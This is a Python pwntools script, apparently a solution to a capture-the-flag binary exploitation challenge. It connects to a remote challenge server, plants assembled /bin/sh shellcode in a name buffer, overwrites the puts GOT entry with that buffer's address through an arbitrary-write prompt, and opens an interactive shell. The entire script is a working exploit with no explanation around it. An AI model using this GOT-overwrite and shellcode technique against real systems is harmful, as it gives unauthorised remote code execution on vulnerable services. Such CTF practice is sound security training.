from pwn import *

context.arch = 'amd64'

# host = '127.0.0.1'
# port = 8888
host = 'csie.ctf.tw'
port = 10129

r = remote(host, port)

put_got = 0x601020
your_name_addr = 0x6010a0

# input('Press enter to continue.')

# what's your name : (48 chars)
r.recvuntil(':')
payload = b'\0'
payload += asm(pwnlib.shellcraft.linux.sh())
r.sendline(payload)

# Where do you want to write : (24 chars)
r.recvuntil(':')
r.sendline(hex(put_got).encode())

# data : (8 chars)
r.recvuntil(':')
r.sendline(p64(your_name_addr + 1))

r.interactive()
